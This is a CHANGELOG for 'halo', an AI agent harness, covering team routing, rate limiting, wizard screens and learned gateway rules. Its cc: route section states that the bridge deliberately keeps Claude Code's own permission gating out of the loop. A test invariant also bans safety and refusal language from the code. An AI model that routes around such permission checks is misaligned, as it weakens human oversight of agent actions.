`halo replay <session-id> --model <ref> [--turn N] [--json]`: fork the
recorded session (the original file is never appended to), truncate the
fork to just before turn N's user prompt, and re-send that turn's own
prompt against the swapped model through plain print mode -- same cwd,
tools and hooks as any `halo -p`. The side-by-side report names both
outcomes (chars, tokens, cost, tools used) and SAME / DIFFERENT with
the first diverging line, turning "did swapping the researcher help?"
into a diff over real task history (the gym stays for synthetic
batteries; this is your own sessions).

### Acceptance-gated sub-agent returns (round 3)

A sub-agent's hand-back is checked against its bio's own `acceptance`
criteria now (the same `expect` wording the teams doctor and the
pipeline gates use). A failure gets ONE retry -- the critique as a
second user turn on the SAME child session, so it corrects itself with
its own context intact (the bio's `critique:` overrides the default
wording). A second failure escalates with the failure MARKED: the
hand-back carries the note, the cost rollup counts the task failed
(round 2's cost-per-accepted), and the task meta records the verdict.
A run that errored never retries on acceptance; a bio with no
acceptance block is the byte-for-byte old path. Team members' criteria
come from the team's own bio for the role.

### Per-role cost attribution (round 2)

Every cost entry names the role that spent it: the session's own model
calls tag their role ("main" for a root session, the bio's role for a
child), and a sub-agent's rolled-up total carries the role, the bio
(agent name) and `ok` -- the Agent call's own outcome. `/stats` and
`halo stats --roles` now answer "who spent what" with task counts
(one rollup node = one Agent-call completion), accepted/total, cost per
task and cost per accepted result, so a role assignment can be judged
by evidence. The main session's own spend appears as its own row for
the first time (it was invisible to `--roles` before); a `cc:` estimate
keeps landing in the subscription lane, never counted as real spend.

## [2.0.5] - 2026-10-07

### Team control (round 5)

The lineup sections are ENFORCED by the live agent loop now (the roadmap's
own "Deferred to 2.0.5 with the Governor" call coming due). A session
running under a team (`team:` in config.json or the new `--team <name>`
flag, which also overlays the team's own resolved role table without
touching config) holds one `teams_runtime.TeamControl` for its whole tree:

- **routing** -- the first routing key (or a member's `use_for` word) in a
  call's description/prompt picks the role/alias at spawn time; the
  template's `default` applies otherwise; an explicit `Agent(role=...)`
  always wins.
- **delegation** -- `max_depth` caps depth, `max_parallel` sizes the
  session's in-flight spawn gate, `handoff` shapes the hand-back
  (summary/full/structured), `forward_text` prepends the parent's latest
  user text.
- **budget** -- `max_budget_usd`/`max_total_turns`/`max_wall_time` (a
  number of seconds or a duration like `3h`) count the whole tree; when
  exhausted the team stops delegating and says so in one line.
  `agents_may_exceed: true` keeps members running while still counting.
- **escalation** -- `triggers` (`tool_failures`, `context_overflow`,
  `budget_exhausted`) switch the session to `to`; `ask: true` shows the
  existing approval card first, `ask: false` switches and announces.
- **context**/**permissions** -- team files/skills load for every member;
  `memory.namespace` is a shared memory dir only `writers` may write;
  mode/rules/offline apply to every member on top of the bio's own.
- **org** -- each member's completion is a one-line report addressed to
  its `reports_to`, delivered as a user-role notice on the root session.
- **pipeline** -- stages run in order; a `required` gate must pass its
  stage's acceptance before the next stage's calls run, an `optional` one
  records and continues.

Agent bios gain `hooks` (`pre_tool`/`post_tool`/`on_start`/`on_finish`,
Claude Code's own hook shape run by the existing hook runner with
`HALO_AGENT` set; a template assignment may override them per key),
`schedule` (`cron`/`every` + prompt, firing the agent as a background job
while a session that loaded the team is alive -- never a system service)
and `triggers` (`on: file_change`/`event`/`message`, one shot per
session). New: `halo agents schedule list|run|pause|resume|rm`, the
`/agents schedule` slash command, `halo doctor --teams [NAME]` (exercises
the first required gate), `/teams show <name>`, and the per-section
enforcement block in `halo teams show`. The loaders validate all the new
sections with one plain line per problem. See docs/AGENTS.md.

### Governor

- **Cross-process adaptive rate limiting per gateway host** (round 4,
  ported from the owner's kit with the review changes applied): one
  shared token bucket + hard in-flight cap per gateway HOST, state on
  disk under `~/.halo/governor/` behind cross-platform file locks
  (flock/msvcrt) with a lock timeout, AIMD (an overload status cuts the
  rate and sets a cooldown honouring `Retry-After` in both its forms,
  capped; sustained success ramps back), priority fairness (main/
  orchestrator 0, judge/reviewer/verifier/tester/planner 1, others 2;
  `governor.priorities` overrides, an agent bio's `limits.priority`
  wins), dead-pid reaping, and a single half-open probe as the only
  fail-open. `providers/governor.py` + `providers/governor_state.py`.
- **One choke point**: every remote model request (`dbx:` `or:` `ant:`
  `oai:` `hf:` `xp:` `ol:`) goes through `governed_upstream()` in
  `providers/http.py` carrying the session's role, agent id, session id
  and model; the Governor owns the 429/overload retry ladder for
  governed routes and the agent loop's own ladder steps aside for those
  (still retrying everything else). `cc:`/`cx:` drive a CLI child, not
  HTTP: not governed. Two caller-side timeouts in a row count as
  overload; transport errors release neutrally; a plain 500 is neutral
  unless the body says overloaded.
- **Failover** (`providers/gateway_routing.py`): fallback candidates
  (the model, `--fallback-model`, then the new `roles.<name>.fallbacks`)
  are ordered by gateway health -- circuit-open hosts skipped,
  least-cooled wins when all are open -- and the switch notice names
  the health that caused it. `halo roles` warns when a fallback shares
  the primary's host (the gateway throttles per machine).
- **Lanes**: models carry a tier, `roles.lanes` maps roles to the
  weakest tier they may use, and the standing rule (reviewer/judge/
  tester never weaker than coder) is enforced by the roles validator
  and the team-template loader.
- **Surfaces**: `/gov` and `halo gov [host]` print every bucket and one
  host's recent calls; the status bar shows `gov 4.0 rps / cooldown
  12 s` while a bucket is below its ceiling; `halo doctor` shows each
  gateway's health; a `governor_state_unpersisted` event lands in the
  transcript when state stops persisting. New doc: `docs/GOVERNOR.md`.
  The suite runs with the Governor off by default
  (`HALO_GOVERNOR=0` from the shared test env); governor tests turn it
  on explicitly.

### cc: route v2

- **The stream-json control channel** (`agent/cc_control.py`, new):
  `control_request`/`control_response` wire shapes live-verified against
  the installed claude 2.1.291 (`docs/harness/CC-CONTROL-CHANNEL.md` has
  the full research, including the exact probes run and what they found).
  Detected once per process from `system.init`'s own `capabilities` list,
  cached on the route.
- **Steer cuts cleanly instead of queuing.** A mid-turn steer now sends
  `control_request` `interrupt` and waits for its own `control_response`
  before sending the steer text as the next message -- the same cut-then-
  continue shape every other route's own steer already has. v1's "queued
  for Claude Code" behaviour is kept only as the fallback for an installed
  version old enough to lack the channel. A real, independently-useful
  fix landed alongside this: `turn_is_error` now always reflects the MOST
  RECENT result in a multi-result turn, never an accumulate-and-stick flag
  that could poison a later, successful result with an earlier one's
  error state.
- **Model changes without a restart.** A `cc:`->`cc:` model change tries a
  live `set_model` control request first -- the SAME subprocess and
  conversation kept exactly as they were -- before falling back to the
  existing close-and-`--resume` restart path on anything older or
  unsupported. `set_permission_mode` is implemented and conformance-
  tested but intentionally never wired to a live behaviour change (it
  would re-enable Claude Code's own permission gating, which this route's
  bridge design deliberately keeps out of the loop).
- **`/compact` forwards to Claude Code for real.** Answered locally by
  the child (no model call needed when there isn't enough to summarize),
  surfaced on halo's transcript the same way a native route's own
  compaction is, with Claude Code's own summary when it provides one.
  Halo's own session log is never rewritten by this.
- **Cost line: subscription turns, never spend.** A `cc:` turn now
  accumulates into `CostMeter.subscription_turns`/`subscription_cost_usd`
  instead of `total_usd` -- shown as its own line/segment in `/cost`,
  `/stats`, `halo stats`, and the status bar, explicitly labelled an
  estimate, never counted toward `--max-budget-usd`.
- **Researched, not shipped**: resuming a halo-native transcript as a
  `cc:` child's OWN history (`--resume` against a transcript halo wrote)
  would require halo to write one of Claude Code's own session files,
  which this project's hard rules forbid -- the capped plain-text summary
  this route has always used is kept, documented, unchanged.
- Tests: `tests/helpers/fake_claude_cc.py` gained the control channel
  behind `FAKE_CLAUDE_CC_CONTROL` (default off -- every pre-existing cc:
  test is unaffected); `tests/test_cc_session.py` gained conformance
  coverage for every control message shape (request/response, unsupported
  subtype, malformed response, child exit mid-request) plus the steer,
  set_model, compaction, and cost-line behaviour above.

### Wizard: agent bios and lineups

- **An Agents step** joins the wizard right after the keys step's own
  model enumeration and before Roles (`"agents"` in `init_wizard.
  ALL_STEP_KEYS`; `halo init --step agents` reaches it directly) --
  list every bio (project/user/shipped), New, New from... (inherits
  from any existing bio with a per-field override toggle: only the
  overridden keys are written to the child file), Edit, Duplicate (a
  shipped bio copied into user scope under the same name), Delete, and
  Import (every `.claude/agents/*.md` file not already a bio, one
  result line each). The bio form (`tui/dialogs/agent_bio_editor.py`,
  new) is one screen over every `agents_yaml.BIO_SECTIONS` field, a
  live YAML preview on the right, and every validation problem shown
  beside the field it names as you type, not only on Save.
- **Two sources for a role slot.** The model picker used by the roles
  editor, the org editor, and the new lineup editor gains a source
  switch (`ctrl+a`): Models (unchanged) or Agents (every bio, with its
  description, preferred model, and a tools summary) -- picking a bio
  records it on the slot alongside the resolved model; "New bio..."
  opens the bio form and is treated as picking the bio it saves.
- **A lineup editor** (`tui/dialogs/lineup_editor.py`, new) replaces
  the Roles step's legacy-template-only editing with a Lineup pane
  shown first (the original role-template editor moves to its own
  "Legacy roles" pane, never removed -- a config with no lineup at all
  still needs it): the assignments grid shows the RESOLVED TRUTH per
  row (agent, preferred model, fallback, price, context, tools count,
  a gym score when one exists) with inline warnings needing no
  Governor (a missing bio, no reachable model, a fallback on the same
  gateway as the preference, a duplicate alias, not-exactly-one
  `role: main`); every other `teams_yaml` section is a collapsed
  one-line-summarized YAML block; a free-text "How the pieces work
  together" field saves as the lineup's own `about:` (drafted on
  request, never blank, marked stale after a further change) and
  reaches an active member's system context under that same heading
  (`teams_yaml.member_system_context_addition`, a new pure function
  this round builds and unit-tests -- wiring it into the live agent
  loop is Governor-round work). Save offers to activate the lineup
  (`teams_yaml.apply_team_template`, writing both `roles.*` and
  `team:` in one step).
- **The same forms outside the wizard**: `/agents`/`/teams` in a
  running session open the same list/form screens (list, new, edit,
  duplicate/delete, activate); `halo agents|teams new|edit --form`
  open them from the CLI (`halo teams edit` is new this round,
  symmetrical with `halo agents edit`). One form module each serves
  the wizard, the slash dialogs, and `--form`.
- Tests: `tests/test_wizard_agents_bios.py`, `tests/test_wizard_
  lineup.py`, `tests/test_agents_teams_forms.py` (new, hermetic
  Textual pilots with a fixture catalog, no network, no real model).
- Docs: `docs/AGENTS.md` (the Agents step, the editor's sections,
  `about`), `docs/ROLES.md`/`docs/ORGS.md` (two sources for a slot),
  `docs/HANDBOOK.md`'s wizard walkthrough, `docs/COMMANDS.md` (`--step`,
  new `halo agents`/`halo teams` sections), `docs/SLASH-COMMANDS.md`
  (`/agents`/`/teams`).

### Wizard and roles fixes (round 2b)

- **Roles on/off is one switch, everywhere**: `halo roles on|off`,
  `/roles on|off`, and a "Roles: on / off" toggle at the TOP of the
  wizard's "Roles and lineup" step (off now hides BOTH panes, not just
  the legacy one, and shows one sentence instead); `halo roles` prints
  the state as its first line; `halo roles template load <name>` now
  also turns roles on (it used to leave the table sitting inert).
- **The `standard` lineup** (`templates/teams/standard.yaml`) assigns
  every role to the shipped `default-model` bio, whose `models.
  preference: default` resolves, live, to the session's own current
  default model (`agents_yaml.resolve_agent_bio`'s own new substitution)
  -- "Roles: off" is exactly this, made explicit and inspectable.
- **Bio editor layout**: both panes are a fixed-height scroll region and
  every field is Textual's own `compact` style, so name/description/
  kind/the model fields are visible on open at 80x24 with no scrolling;
  the preferred/fallback field shares one row with its own "Pick..."
  button.
- **Bio editor model picking, root cause**: Ctrl+P/Ctrl+F opened nothing
  because Textual's App always claims `ctrl+p` for its own command
  palette as a priority binding, ahead of any Screen's own binding on
  the same key -- the picker's models were never the problem. Fixed by
  borrowing `app.action_command_palette` for as long as the bio editor
  (and the lineup/org editors, which had the identical collision) is on
  top of the stack.
- **Bug sweep**: Enter on a highlighted bio/lineup/template row opens or
  applies it everywhere (the buttons stay, but are no longer the only
  path); every touched screen focuses its own list/first field on open,
  never a button; the Roles step's Lineup pane applies the highlighted
  lineup on a plain Next, with a check mark on the row Next would apply.
- **Packaging**: `scripts/release.py` rewrites the README's own version
  badge (alt text and badge URL) to the released version and publishes
  a GitHub release for the tag (`gh` CLI, else `curl` with a `git
  credential fill` token -- both only ever through the script's own
  injectable run function); `--no-github-release` skips it. README's
  badge fixed to 2.0.4 (was stuck at 2.0.1).

### Wizard interaction model (round 2c)

`docs/WIZARD.md` (new) names the ten rules every wizard screen now
follows; linked from `docs/HANDBOOK.md`'s own walkthrough (rewritten
around the two items below) and `docs/COMMANDS.md`.

- **Quick setup by default**: the wizard's first screen offers "Quick
  setup" (Providers -> Default model -> Summary -- every role, including
  a spawned sub-agent, ends up on that one model) and "Full setup"
  (every step); Quick is the highlighted default, no confirm button
  needed. Full setup's own Summary gained "Change" jumps, one row per
  step this run actually used.
- **One "Team" step** replaces the "Agents" step and "Roles and lineup"
  step: a single "Custom roles: off / on" switch; off shows one sentence
  and nothing else; on shows Lineups (the active one checked, Enter
  edits, Ctrl+N/Ctrl+D) and Agents (Enter edits, Ctrl+N/Ctrl+D/Del) side
  by side at 120 columns, stacked behind a pane switch at 80. `--step
  team` reaches it; `--step agents`/`--step roles` (and `/setup`/`halo
  setup`'s own "team"/"roles" spellings) stay as aliases for the same
  screen. Turning custom roles off never disables delegation or the
  question card -- the shipped `standard` lineup still gives every role,
  including an unconfigured sub-agent, the default model.
- **A step rail** across the top of every step (current highlighted,
  done ticked); Ctrl+Left/Ctrl+Right walk it from anywhere, replacing the
  round-7 Ctrl+N/Ctrl+B (freed for "new"/"duplicate" below).
- **Autocomplete under a model field**: a filtered dropdown as you type,
  Enter picks, Escape closes it without leaving the screen underneath --
  the agent bio editor's preferred/fallback fields, the org editor's
  "Role or model", the lineup grid's "Agent or model" (suggests bio
  names, what that field actually holds), and a new quick filter above
  the role-template editor's own role list. Ctrl+P still opens the full
  picker everywhere.
- **Rule 1 (highlight is selection) and rule 7 (focus on open)** now
  apply to the default-model, permission-mode, theme and organization
  pickers too, with the same check mark the lineup pane already had;
  every step's own header is now one sentence naming its current choice
  ("Default model: `<ref>`. Enter to change.").
- A found-and-fixed Textual behaviour, documented in
  `tui/dialogs/agents_step.py`/`step_rail.py`: `DOMNode._merge_bindings`
  only reads `BINDINGS` off a class that is itself a `DOMNode` subclass
  -- a plain mixin's `BINDINGS` list is silently never bound. The new
  chords are plain tuples (`AGENTS_LIST_BINDINGS`, `STEP_RAIL_BINDINGS`)
  each concrete screen splices into its own `BINDINGS`; the action
  methods stay on the mixins, unaffected (ordinary method lookup).
- New modules, `init_wizard.py` growing by registration lines only:
  `tui/dialogs/wizard_ux.py` (the rule 1/2/6/7/8/9 helpers), `step_rail.
  py`, `autocomplete.py`, `setup_mode.py` (the Quick/Full chooser),
  `team_step.py` (`TeamStep`) -- `agents_step.AgentsStep` and `init_
  wizard.RolesStep` are gone, folded into it.

### Learned gateway rules

- **One engine for parameter rejections** (`providers/learned_params.py`,
  new): generalises the 1.0.1 gpt-6 `reasoning_effort`-with-tools rule
  (2.0.3-brief.md item G1) to every request field a gateway can reject
  that no existing specific check already owns -- `temperature`, `top_p`,
  `tool_choice`, `max_tokens`, `max_completion_tokens`, `thinking`,
  `output_config`, `response_format`, `parallel_tool_calls`, `strict`,
  `store`, `stream_options`, `metadata`, `stop` (the Databricks allowlist
  word), and the effort family itself on a wording the existing gpt-6/
  GLM/Claude checks don't recognize. On a 400/422 naming one of these, the
  smallest fix is planned (drop the field; clamp to the nearest allowed
  value when the message lists one -- the same "xhigh -> max" convention
  `profiles.clamp_effort` already uses for an effort-shaped value), the
  request is retried exactly ONCE, and -- only once that retry is
  CONFIRMED to have worked -- the fix is persisted to `~/.halo/learned-
  rules.json` under a new `"params"` sub-object (`{"<provider>:<model>":
  {"params": {"<field>": {"action", "value", "error", "date"}}}}`, beside
  every existing learned field in that same row) and announced with one
  house-voice transcript line ("Databricks rejected max_tokens on this
  endpoint; dropped it and retried; remembered for this endpoint"). A
  `model_table.json` row's own explicit `temperature`/`top_p` still wins
  outright over a learned rule (today's precedence, same rule `reasoning_
  effort_with_tools`/`tools_rejected` already follow); every later request
  against that same endpoint applies a FRESH (<=30 day) learned fix
  pre-emptively, before it ever pays for the round trip again; a rule
  older than 30 days is tried once bare before being relearned, so a
  since-fixed rejection self-heals with no action needed. `tools` keeps
  its own never-silently-drop handling and is deliberately never touched
  by this engine.
- **`halo rules` / `/rules`**: lists every learned parameter rule
  (endpoint, field, action, age); `--forget <provider:model>` (CLI) /
  `forget <provider:model>` (slash) clears one endpoint's rules; `halo
  models --forget-rules` clears every endpoint's at once.
- **`halo doctor --work --probe-all --learn`**: pre-learns by sending one
  minimal request per optional parameter (today: `temperature`/`top_p`/
  `stream_options`/`stop` -- the only watched fields that actually reach
  the wire through Databricks' own client-side body allowlist) to each
  configured endpoint -- opt-in, prints the cost estimate first, never
  sends a thing without the flag.
- Tests: `tests/test_learned_params.py` (new) -- every rejection shape
  seen so far (gpt-6 `reasoning_effort` + tools, GLM `thinking`, Claude
  `output_config` `xhigh`, an unknown-field 400, an allowed-values 422,
  and a 400 naming no field at all), the persistence shape, the 30-day
  stale-then-relearn behaviour, precedence, `--forget`/`--forget-rules`,
  the `xp:` ignored-parameters reader surviving the module split, and two
  live end-to-end runs against a mock Databricks gateway proving exactly
  one retry, the transcript line, and pre-emptive application on a later
  turn. No network, no real model.

### OpenAI-dialect Ollama hosts (round 5)

- **`ollama.hosts` entries learn an optional `"dialect": "openai"`** --
  an OpenAI-dialect GATEWAY in front of Ollama (a no-think proxy serving
  only `/v1/chat/completions` + `/v1/models`, with the entry's
  `api_key` as its bearer) can be used as a real `ol:` host, keeping the
  `ol:` provider identity (picker grouping, balances, error mapping)
  instead of burning an `or:` alias + `OPENROUTER_BASE_URL` override on
  it. The ref keeps parsing as `ol:` (native dialect, exactly as
  before); the flip happens where the host entry is already resolved --
  `providers.ollama.apply_host_dialect` (identity-preserving,
  idempotent, never changes a native host) is applied at Session
  construction, `set_model`, `call_small_model` (hooks/titles/`/local`)
  and the compaction-model override, so the whole session rides
  `call_openai_chat` with the host entry's own url (`/v1` added) and
  key. Catalog/enumeration (`get_catalog` -> `/local`/`/model`/`halo
  models`), the `halo ollama` panel's reachability probe, `halo doctor`
  (names the dialect per host) and `halo doctor --local` (the generic
  openai-chat sender) all read `/v1/models` for such a host. An
  unrecognized dialect value falls back to native with a doctor WARN
  naming the value. Tests: `tests/test_ollama_openai_host.py` (new) --
  parse/fallback, the doctor lines, a MockUpstream gateway end-to-end
  through a real `halo -p` child (path `/v1/chat/completions`, the
  host's own bearer, zero `/api/chat`), a native control child, and the
  per-dialect enumeration path.

### Deprecations

- **The legacy env file is no longer read.** `~/.config/vibes-hacker/env`
  (announced in the [2.0.1] CHANGELOG, WARNed by `halo doctor` since
  [2.0.2]) is no longer consulted by `load_provider_env_files()` --
  `~/.config/halo/env`/`HALO_ENV_FILE` is the only credential source now.
  The legacy file is never modified or deleted by this harness (other
  tools on the same box may still read it); `halo init`'s one-time copy-
  forward (copying its content into the new file, with an import marker,
  the first time `halo init` writes there) is unaffected and remains the
  migration path. `halo doctor` now WARNs specifically when the legacy
  file is the only one present (naming `halo init`), says nothing is
  wrong once the new file exists, and keeps its ordinary WARN when
  neither exists.

### The old name is gone

- **The previous project name is off the front pages** (owner's call,
  2026-10-06: "just don't mention it directly on the first pages of the
  repo, whatever if it's in the change logs"). `README.md`, the two
  INSTALL pages, `docs/HANDBOOK.md`, `docs/COMMANDS.md`, the package
  description in `pyproject.toml` and every line the installers print say
  only `halo`; where a legacy behaviour must be described they say "the
  previous name" or "pre-2.0 installs". The compatibility code, its
  tests, this CHANGELOG and the plans/ history are untouched on purpose
  -- the old command still works exactly as documented. A new house
  invariant (tests/test_invariants.py, (h)) refuses the name -- both
  separators, case-insensitive -- on exactly those front pages, with the
  pattern built from parts so even the test never spells it out. The
  installers' old-tool detection and uninstall commands build the name
  from parts too and behave identically.

### README and screenshots

- **`halo --version` prints an ASCII wordmark** -- a five-row figlet-style
  HALO banner from one new module (`halo_harness/banner.py`), with the
  version line underneath. The same banner is the first entry of the
  launch intro pool (it types out, then the version lands under the art)
  and the README's opening block; `tests/test_intro_lines.py` pins the
  README's copy against the module so the three can never drift.
- **`scripts/screenshots.py` renders the README's gallery** -- seven
  120x36 SVG scenes (first launch, a mid-turn with the phase line and a
  running tool card, the model picker, the wizard's Team step, the `/mcp`
  dialog with a failing server, a permission card, balances) driven by
  Textual pilots over fixture data only: a scripted FakeController,
  fixture picker rows, fixture bios and the shipped team templates, a
  fake MCP server list, a fixture permission ask, fixture balances.
  Deterministic by construction -- fixed seed, a frozen clock set through
  the same `started_at`/`_refresh` seams the tests use, Textual's random
  per-export CSS id normalized, LF line endings pinned by
  `.gitattributes` -- so a rerun is byte-identical. `tests/test_
  screenshots.py` re-renders and fails if the committed `docs/screenshots/
  *.svg` are not the script's exact output. The SVGs carry no real path,
  balance or model id (the session cwd is the literal `~/project`).
- **The README is restructured around them**: banner, one paragraph of
  what Halo is, the gallery with one-sentence captions, a two-column
  feature grid (routes, agent bios and lineups, the wizard, the MCP deep
  dive, learned rules, balances and picker columns, the privacy audit,
  CI and the release script), a three-line install, and a themes section
  the 2.0.8 theme pack (DOOM, Metroid, Mario) will fill with one render
  each.

### Release-review fix pass

Four blockers from the 2.0.5 release review, plus minors and nits. Each
fix has a pinning test in `tests/test_governor_review.py`,
`tests/test_agents_schedule.py` or `tests/test_teams_runtime.py`.

- **The Governor's retry ladder broke on real connections** (finding 1):
  every `call_*` opens one `http.client` connection and re-requests it,
  so an overload response that was never drained made the retry's
  `conn.request()` raise `ResponseNotReady` (surfacing as a connect
  failure the loop then retried as a 502) or corrupt the next parse. The
  retry branch now drains and closes the overload response before
  looping -- only the retry branch; a success (and the proxy's
  single-shot overload) still streams untouched.
- **The loop's "step aside" never fired for raised overload errors**
  (finding 2): `_step`'s UpstreamError branch passed the exception
  object where `(status, message)` was expected, so the check was always
  false and the loop re-ran its own backoff over 429/503 -- the exact
  double ladder round 4 removed (and GOVERNOR.md documented). Fixed; the
  pin drives a real turn against a 429 upstream with the Governor on and
  asserts exactly one loop-level attempt.
- **Cron schedules never fired** (finding 3): the next fire was computed
  from `now`, but `cron_next` returns a time strictly after its argument,
  so a due cron entry was never due. The next fire is now computed from
  the last fire point (or arming), like `every:` always did. The `5/2`
  step form (a single-value base with a step) also matches the whole run
  5,7,9,... now, not just 5 (nit 14).
- **A contended cross-process lock escaped the choke point** (finding 4):
  `LockFailed` after the 30 s lock timeout surfaced raw from every
  governed call (REVIEW item 4's warning + degraded flag + in-process
  fallthrough were never wired into `governed_upstream`). The acquire/
  report calls now catch it: one `warn_once` (which sets the degraded
  flag `is_degraded()`/doctor report), and the call proceeds ungoverned
  for that one call. A re-registered waiter (reaped between passes) is
  persisted immediately too (finding 7).
- **500 bodies were truncated at 2 KB** by the overload-peek (finding 5):
  the bounded read is 64 KB now.
- **Scheduled/triggered fires ran a bare prompt session, not the agent**
  (finding 6): both fire argv builders (`build_fire_argv`/`run_once`)
  pass `--agent` and `--team` when the entry carries them. The detached
  fallback (no live job registry) also spawns the argv LIST directly
  instead of a `shlex.join` string through `shell=True`, which cmd.exe
  mangles (nit 10), and `last_note` is written under the scheduler lock
  (nit 13).
- **A declined team escalation came back every turn** (finding 8): the
  decline path now sets `team.escalated`, so the card is shown once
  (the accepted switch already set it).
- **`HALO_GOVERNOR` typos silently forced the Governor on** (nit 9):
  only an explicit `1`/`true`/`yes`/`on` forces on and
  `0`/`false`/`no`/`off` forces off; any other value (case-insensitive)
  is ignored and config decides. The dead `select` import in
  `governor_state` is gone (nit 11). Learned-rules caching (nit 12) is
  deferred to 2.0.6.
- **A regression finding 2's fix introduced, caught by the pre-tag
  suite gate** (CI was red on it, both platforms): a post-connect
  transport drop (a dropped keep-alive, a mid-response RST) is
  re-labelled a plain 502 by the wire mapper, and the error translator
  then replaced its message with the canned 529 "gateway returned a bad
  response" sentence -- so the loop's new, working Governor step-aside
  mistook the drop for an overload the Governor had already paced and
  retried (it had not: the Governor paces HTTP response statuses only;
  a dropped connection produced no response). The turn died after phase
  1's single immediate re-dial instead of riding the backoff ladder.
  `is_post_connect_failure_message` now joins the byte-for-byte guard
  in the translator (beside the connect-failure wording it mirrors) and
  the ownership check declines it -- a dropped keep-alive retries on
  the loop's own ladder again, pinned both synthetically and against a
  real socket close with the Governor on.
- **A pure read no longer creates the Governor's state dir** (found by
  CI's real-state guard, red since round 4): `state_dir()` made the
  directory on every call, so `/gov`'s table, `halo doctor`'s gateway
  health and a plain state `load` conjured an empty `~/.halo/governor/`
  on a machine that had never run a governed call. Path resolution and
  directory creation are split now -- the three writers (the bucket
  lock, the state save, the call-log append) create it on demand, with
  the same one-warning degraded fallback when the dir cannot be made.

## [2.0.4] - 2026-10-06

### Tooling

- **GitHub Actions now runs the three suites on every push and pull
  request** (`.github/workflows/suites.yml`): `test_bridge.py`,
  `tests/run_all.py`, and `test_tui.py`, on Linux and Windows, Python
  3.12, each with its own hard timeout so one slow/hanging suite never
  hides the other two. A job summary shows pass/fail for all three at a
  glance; the full logs upload as a build artifact only on failure. The
  orchestrator's manual three-platform run is now the exception (real
  local models, real MCP servers, real hardware), not the normal way the
  suites get run -- see `docs/CONTRIBUTING.md`.
- **A release script** (`scripts/release.py <version>`) replaces the
  hand-run release checklist: refuses on a dirty tree under
  `halo_harness/`, `tests/`, or `docs/`; sets (or verifies)
  `halo_harness/__init__.py::__version__`; requires and dates the
  CHANGELOG's own `## [<version>] - unreleased` section; commits, tags,
  and pushes; refreshes the local install (printing the command instead
  of running it when a halo session looks like it's already running) and
  any `--remote user@host` given on the command line. `--dry-run` prints
  every step with nothing executed; `tests/test_release_script.py` drives
  it against a scratch git repo.
- **House invariants, one test per rule** (`tests/test_invariants.py`):
  no safety/refusal language in `halo_harness/`, `docs/`, or `tests/`; the
  network choke point; no file under `halo_harness/` bypassing
  `BRIDGE_TEST_HOME`; every slash command and CLI flag documented; the
  privacy scan; no test module exporting `BRIDGE_STATE_DIR` for its whole
  run. Several reference the module that already covered that ground
  (`tests/test_offline_mode.py`, `tests/test_privacy_scan.py`,
  `tests/test_docs_slash_commands.py`, `tests/test_docs_commands.py`)
  rather than duplicating it.

### History and privacy
- **History rewritten on 2026-10-05**: four stray cache files and a handful
  of already-fixed identifying strings were removed from every commit (never
  from the current tree; those were fixed long ago). Every commit hash
  changed and every `v*` tag was re-pointed. Re-clone, or run
  `git fetch && git reset --hard origin/master` in an existing checkout.

- **`halo audit privacy [--history] [--json] [--since <rev>]`**: scans
  the working tree by default (every tracked plus untracked, non-ignored
  file) for real user-profile paths, private-range and link-local IP
  literals, LAN hostnames and `.local` names, known machine/vendor names,
  stray `%SystemDrive%`/`%USERPROFILE%`-style cache files, key- and
  token-shaped strings, e-mail addresses, and any real path under the
  state dir; exits 1 when it finds anything, 0 when clean. `--history`
  runs the same rules over every distinct blob reachable from HEAD
  (scanned once each, reported at the earliest commit that introduced
  it), and splits the result into paths to remove entirely versus paths
  that stay with specific text needing replacement. `--json` gives the
  same fields as machine-readable output. Every excerpt this prints has
  already had the matched value replaced with `<redacted>` -- the real
  value never reaches the report. The rule set
  (`halo_harness/privacy_rules.py`) is the single source both this
  command and `tests/test_privacy_scan.py`'s own regression guard read,
  so the two can no longer drift apart.
- **`plans/2.0.4-history-rewrite-plan.md`**: the written plan for
  rewriting this repo's history (produced from a real `halo audit
  privacy --history --json` run against this repo) -- the paths to
  purge entirely, the text replacements, the tags to re-create, the two
  clones to reset, the verification steps, and the CHANGELOG
  announcement. Writing the plan does not run it: no history was
  rewritten, no force-push happened, and `git filter-repo` was not
  invoked, by this round.

### Experiential Labs

- **`xp:<slug>` route** onto the Experiential Labs gateway
  (`EXPLABS_API_KEY`), with its own `ProviderProfile` (none of
  OpenRouter's fields -- `usage.include`, a `provider` preference object,
  `transforms` -- are ever sent, since this gateway's own schema doesn't
  define them) and three dialects: chat completions by default, the
  Responses dialect shared with the `oai:` route per `experiential.
  dialect_overrides`, and -- for a Claude slug (`xp:claude-*`) -- Halo's
  existing native Anthropic passthrough at `/v1/messages` with
  `x-api-key`, so thinking stays native while an Anthropic-shaped rung
  serves the call. `tools`/`reasoning_effort`/structured output are each
  gated on that model's own catalog row.
- **Catalog** (`halo_harness/providers/experiential_catalog.py`): `GET
  /v1/models` cached with the same TTL every other catalog here uses,
  refreshed by `/models refresh`/`halo models --refresh`/launch
  auto-refresh; a vendored fallback snapshot
  (`halo_harness/providers/catalog/experiential-models.json`, built from
  already-published facts, no key, no secret) so a fresh install shows
  real context/price/capability columns before ever refreshing live.
- **Picker**: an "Experiential Labs" group with the same price/context
  columns every other group shows, plus a one-word data-policy badge
  (`zdr`/`no_training`). The shared column formatter (`model_display.
  format_price_per_m`) now also renders a negative per-token/per-million
  sentinel (an OpenRouter router model's own `-1`, e.g. `openrouter/auto`,
  `typesafe/jev-router`, `nvidia/switchyard`) as "varies" instead of a
  negative dollar figure, and exactly `$0` as "free".
- **Cost**: per-turn cost reads `usage.cost`; the serving `provider` and
  `is_byok` ride the same per-chunk capture OpenRouter's own `provider`
  field already uses, so the transcript's responding-provider label shows
  the real serving rung. `GET /api/v1/credits` feeds a balance line in
  `halo doctor`/`halo providers`; `halo stats --experiential` pages
  settled rows from `GET /api/v1/usage`. Every `xp:` chat-completions
  request carries `safety_identifier` set to the Halo session id
  (documented, opt-out) for per-session spend tracking.
- **Errors**: the gateway's own `error.code` (`unsupported_capability`,
  `unavailable_route`, `pro_required`, `invalid_key`, the `idempotency_
  conflict`/`idempotency_replay_unavailable` split on one shared HTTP
  409, ...) maps to one plain sentence each, checked before the generic
  status-code fallback. The `x-experiential-ignored-parameters` response
  header is learned per model and surfaced once as a notice, never
  repeated for an unchanged value.
- **Tool search**: `{"type": "openrouter:tool_search"}` plus per-tool
  `defer_loading: true`, converting Halo's own already-deferred-tool
  decision into this gateway's wire convention -- off by default behind
  `experiential.tool_search`.
- **Waterfall**: `gateway.retry.max_attempts_per_route` is always sent as
  `1` by default (Halo's own outer retry loop is already the outer
  layer); `gateway.routing`/`gateway.retry` are configurable via
  `experiential.routing`/`experiential.retry`. `/xp routes <slug>` prints
